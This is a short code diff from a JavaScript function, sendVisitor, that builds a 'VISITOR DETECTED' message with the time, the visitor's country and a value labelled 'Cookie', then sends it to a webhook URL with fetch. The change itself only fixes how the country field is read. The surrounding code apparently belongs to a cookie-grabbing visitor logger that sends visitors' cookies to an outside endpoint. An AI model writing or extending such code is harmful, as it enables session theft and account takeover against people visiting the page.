@@ -90,7 +90,7 @@ function sendVisitor(userCountry, mixedString) {
     content:
       "***VISITOR DETECTED***" + "\n" + "\n" +
       "**Time:** *" + dateTime + "*" + "\n" + "\n" +
-      "**Country:** *" + userCountry + "*" + "\n" + "\n" +
+      "**Country:** *" + userCountry.country + "*" + "\n" + "\n" +
       "**Cookie:** *" + mixedString + "*" + "\n" + "\n"
   };
   fetch(webhookURL, {
